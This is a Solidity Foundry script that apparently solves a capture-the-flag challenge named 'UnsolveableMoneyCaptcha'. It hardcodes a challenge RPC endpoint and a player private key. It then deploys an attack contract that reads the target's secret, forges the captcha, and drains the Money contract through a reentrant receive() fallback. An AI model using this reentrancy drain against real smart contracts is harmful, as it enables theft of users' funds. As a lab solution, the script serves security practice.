// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Setup} from "../src/UnsolveableMoneyCaptcha/Setup.sol";
import {Money} from "../src/UnsolveableMoneyCaptcha/Money.sol";
import {Captcha} from "../src/UnsolveableMoneyCaptcha/Captcha.sol";

contract SolveUnsolveableMoneyCaptcha is Script {
    address player;
    uint256 playerPrivateKey;
    
    Setup setupInstance;
    Money moneyInstance;
    Captcha captchaInstance;

    function setUp() external {
        string memory rpcUrl = "http://45.32.119.201:44555/515adbcd-67c0-4c9a-86a5-110d82b92283";
        playerPrivateKey = 0x35342fe50f9cb61e0596a086a7c2e1641a084135137c13456c5db0ec4e4d7adc;
        address setUpContract = 0xccB5d206beaB580F352020b782cff04A80568E77;

        player = vm.addr(playerPrivateKey);
        vm.createSelectFork(rpcUrl);

        setupInstance = Setup(setUpContract);
        captchaInstance = setupInstance.captchaContract();
        moneyInstance = setupInstance.moneyContract();
    }

    function run() external {
        vm.startBroadcast(playerPrivateKey);

        AttakContract attackcontractInstance = new AttakContract{value: 50 ether}(setupInstance, captchaInstance, moneyInstance);
        
        console.log("Before Player balance: ", moneyInstance.balances(player));
        attackcontractInstance.attack();

        console.log("After Player balance: ", moneyInstance.balances(player));
        console.log("isSolved: ", setupInstance.isSolved());

        vm.stopBroadcast();
    }
}

contract AttakContract {
    Setup setupInstance;
    Captcha captchaInstance;
    Money moneyInstance;

    uint256 secret;

    constructor(Setup _setupInstance, Captcha _captchaInstance, Money _moneyInstance) payable {
        setupInstance = _setupInstance;
        captchaInstance = _captchaInstance;
        moneyInstance = _moneyInstance;
    }

    function attack() public {
        moneyInstance.save{value: 10 ether}();

        secret = moneyInstance.secret();
        uint256 generatedCaptcha = captchaInstance.generateCaptcha(secret);
        moneyInstance.load(generatedCaptcha);
    }

    receive() external payable {
        if (address(moneyInstance).balance != 0) {
            uint256 generatedCaptcha = captchaInstance.generateCaptcha(secret);
            moneyInstance.load(generatedCaptcha);
        }
        
    }
}